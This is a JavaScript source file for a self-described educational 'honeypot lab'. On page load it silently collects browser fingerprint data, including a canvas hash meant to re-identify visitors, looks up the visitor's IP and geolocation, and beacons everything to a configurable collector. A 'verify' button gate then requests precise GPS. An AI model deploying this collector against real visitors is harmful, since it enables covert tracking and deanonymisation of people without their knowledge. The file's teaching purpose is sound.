// Honeypot lab — client-side collector.
// Educational: shows exactly what a browser leaks with zero interaction, and
// what extra it leaks once a user grants the geolocation "consenso".
(async () => {
  "use strict";
  // Local lab -> "/log". On free static hosting (GitHub Pages, etc.) set
  // window.COLLECTOR_URL to your serverless collector (see cloudflare/worker.js).
  const ENDPOINT = (typeof window !== "undefined" && window.COLLECTOR_URL) || "/log";

  function passive() {
    const n = navigator;
    return {
      page_url: location.href,
      referrer: document.referrer || null,
      user_agent: n.userAgent,
      languages: n.languages,
      platform: n.platform,
      hardware_concurrency: n.hardwareConcurrency ?? null,
      device_memory: n.deviceMemory ?? null,
      max_touch_points: n.maxTouchPoints ?? null,
      screen: { w: screen.width, h: screen.height, dpr: devicePixelRatio, color_depth: screen.colorDepth },
      viewport: { w: innerWidth, h: innerHeight },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      tz_offset_min: new Date().getTimezoneOffset(),
      touch: ("ontouchstart" in window) || n.maxTouchPoints > 0,
      cookies_enabled: n.cookieEnabled,
      do_not_track: n.doNotTrack,
      canvas_fp: canvasFingerprint(),
    };
  }

  // A tiny canvas fingerprint: the same browser/GPU/font stack renders
  // pixel-identically, so this hash re-identifies a visitor across sessions.
  function canvasFingerprint() {
    try {
      const c = document.createElement("canvas");
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(10, 10, 100, 30);
      ctx.fillStyle = "#069";
      ctx.fillText("honeypot-lab-\u{1F41D}", 12, 15);
      const data = c.toDataURL();
      let h = 0;
      for (let i = 0; i < data.length; i++) h = (h * 31 + data.charCodeAt(i)) >>> 0;
      return h.toString(16);
    } catch (_) { return null; }
  }

  // Public IP + coarse geo, no API key, CORS-enabled. ipwho.is primary,
  // freeipapi.com fallback. This is the visitor's OWN public IP as seen by
  // the API's edge — useful, but the collector's server-side IP is ground truth.
  function geoOpts() {
    const o = { cache: "no-store" };
    if (typeof AbortSignal !== "undefined" && AbortSignal.timeout) o.signal = AbortSignal.timeout(4000);
    return o;
  }
  async function ipGeo() {
    try {
      const j = await (await fetch("https://ipwho.is/", geoOpts())).json();
      if (j && j.success !== false) {
        return { source: "ipwho.is", ip: j.ip, city: j.city, region: j.region,
                 country: j.country, lat: j.latitude, lon: j.longitude,
                 isp: j.connection?.isp, asn: j.connection?.asn };
      }
    } catch (_) {}
    try {
      const j = await (await fetch("https://freeipapi.com/api/json", geoOpts())).json();
      return { source: "freeipapi", ip: j.ipAddress, city: j.cityName,
               region: j.regionName, country: j.countryName, lat: j.latitude, lon: j.longitude };
    } catch (_) {}
    return null;
  }

  function send(body) {
    const data = JSON.stringify(body);
    // text/plain is CORS-safelisted, so cross-origin beacons to a serverless
    // collector work without a preflight; the collector JSON-parses regardless.
    const blob = new Blob([data], { type: "text/plain" });
    if (navigator.sendBeacon && navigator.sendBeacon(ENDPOINT, blob)) return;
    fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "text/plain" },
                      body: data, keepalive: true, mode: "cors" });
  }

  // Stage 1 — passive capture, sent IMMEDIATELY. No dependency on any third
  // party, so a blocked/slow IP API can't suppress the core hit. The collector
  // already records the real IP + geo server-side.
  const base = passive();
  send({ stage: "load", ...base });

  // Stage 1b — best-effort client-reported IP/geo as a separate, non-blocking
  // beacon (may be blocked by privacy tools; that's fine).
  ipGeo().then((g) => { if (g) send({ stage: "ip_enrich", canvas_fp: base.canvas_fp, ip_geo: g }); });

  // Stage 2 — precise GPS, consent-gated behind the button.
  const btn = document.getElementById("verify");
  btn?.addEventListener("click", () => {
    if (!navigator.geolocation) return reveal();
    navigator.geolocation.getCurrentPosition(
      (p) => { send({ stage: "precise_location", canvas_fp: base.canvas_fp,
                      gps: { lat: p.coords.latitude, lon: p.coords.longitude, accuracy_m: p.coords.accuracy } });
               reveal(); },
      (e) => { send({ stage: "precise_location_denied", canvas_fp: base.canvas_fp, error: e.message });
               reveal(); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });

  function reveal() {
    document.getElementById("gate")?.classList.add("hidden");
    document.getElementById("content")?.classList.remove("hidden");
  }
})();
